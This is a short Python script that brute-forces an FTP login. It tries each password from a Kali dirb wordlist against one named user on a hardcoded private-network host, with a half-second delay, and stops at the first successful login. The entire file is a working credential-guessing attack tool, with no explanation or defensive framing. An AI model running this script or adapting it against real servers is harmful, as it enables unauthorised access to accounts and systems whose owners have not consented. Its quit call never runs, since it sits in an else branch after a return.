import ftplib
import time
def brute_ftp(host,user,password):
    ftp = ftplib.FTP(host)
    try:
        res = ftp.login(user,password)
        print("[+] Success host:%s user:%s password: %s" %(host,user,password))
        print(res)
        return True
    except:
        print("[-] user:%s password:%s" %(user,password))
        return False
    else:
        ftp.quit()

def get_password(dirb):
    with open(dirb) as f:
        password = f.readlines()
    return password
# 配置
def main():
    host = '172.20.10.139'
    user = 'yangfan'
    dirb = '/usr/share/wordlists/dirb/small.txt'
    for passwd in get_password(dirb):
        passwd = passwd.strip('\n')
        state = brute_ftp(host,user,passwd)
        time.sleep(0.5)		
        if state == True:
            break
        elif state == False:
            continue


if __name__=='__main__':
    main()
